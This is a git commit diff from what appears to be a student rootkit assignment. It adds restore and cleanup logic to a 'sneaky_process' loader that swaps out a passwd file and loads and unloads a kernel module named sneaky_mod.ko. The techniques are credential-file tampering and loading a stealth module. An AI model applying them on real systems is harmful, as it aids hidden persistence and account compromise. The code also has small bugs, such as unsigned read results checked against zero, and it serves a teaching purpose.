56bfd354ffdfe2f5de6e18d4d8f19886eed0105e
hw210 <hw210@duke.edu>
2019-04-10 21:41:16 -0400

    process done

--- hw5/process.c
+++ hw5/process.c
@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <sys/types.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 #define REAL_PWD "etc/passwd"
@@ -28,7 +29,7 @@ int replace_pwd() {
     byte_read = read(real_pwd, read_buf, sizeof(read_buf));
 
     if (byte_read < 0) {
-      printf("byte_read < 0,read error!\n");
+      printf("REPLACE_PWD:byte_read < 0,read error!\n");
       return -1;
     } else if (byte_read == 0) {
       break; // end of reading,break while loop
@@ -37,7 +38,7 @@ int replace_pwd() {
     byte_write = write(fake_pwd, read_buf, byte_read);
 
     if (byte_write < 0) {
-      printf("sneaky_process failed to write\n");
+      printf("REPLACE_PWD:sneaky_process failed to write\n");
       return -1;
     }
   }
@@ -56,6 +57,40 @@ int replace_pwd() {
   }
   return 0;
 }
+
+int restore_pwd() {
+  char read_buf[10000];
+  size_t byte_read;
+  size_t byte_write;
+  int real_pwd = open(FAKE_PWD, O_RDONLY);
+  int fake_pwd = open(REAL_PWD, O_CREAT | O_WRONLY | O_TRUNC, 0600);
+
+  if (real_pwd < 0 || fake_pwd < 0) {
+    printf(
+        "sneaky_process failed to open real_pwd /& fake_pwd,error number:%d\n",
+        errno);
+    return -1;
+  }
+
+  while (1) {
+    byte_read = read(real_pwd, read_buf, sizeof(read_buf));
+
+    if (byte_read < 0) {
+      printf("RESOTRE_PWD:byte_read < 0,read error!\n");
+      return -1;
+    } else if (byte_read == 0) {
+      break; // end of reading,break while loop
+    }
+
+    byte_write = write(fake_pwd, read_buf, byte_read);
+
+    if (byte_write < 0) {
+      printf("RESOTRE_PWD:sneaky_process failed to write\n");
+      return -1;
+    }
+  }
+}
+
 int insert_module(pid_t id) {
   char buffer[40];
   snprintf(buffer, 40, "%d", id);
@@ -67,6 +102,33 @@ int insert_module(pid_t id) {
   arguments[3] = NULL;
   return execvp(arguments[0], arguments);
 }
+
+int remove_module() {
+  char *arguments[3];
+  arguments[0] = "rmmod";
+  arguments[1] = "sneaky_mod.ko";
+  arguments[2] = NULL;
+
+  pid_t pid = fork();
+  int status;
+  if (pid == -1) {
+    printf("can't fork,error occured\n");
+    exit(EXIT_FAILURE);
+  } else if (pid == 0) { // child
+
+    if (execvp(arguments[0], arguments) < 0) {
+      perror("failed to remove module\n");
+    }
+  } else { // parent
+    printf("parent process,pid = %u\n", getpid());
+    pid_t parent;
+    if ((parent = waitpid(pid, &status, 0)) <= 0) {
+      printf("waitpid() failed\n");
+    }
+  }
+  return 0;
+}
+
 int main(int argc, char *argv[]) {
   printf("sneaky_process pid = %d\n", getpid());
   replace_pwd();
@@ -89,4 +151,16 @@ int main(int argc, char *argv[]) {
       printf("waitpid() failed\n");
     }
   }
+
+  while (1) {
+    if (getchar() == 'q') {
+      if (remove_module() != 0) {
+        perror("Oh,failed to remove sneaky module!\n");
+      } else {
+        restore_pwd();
+        break;
+      }
+    }
+  }
+  return EXIT_SUCCESS;
 }
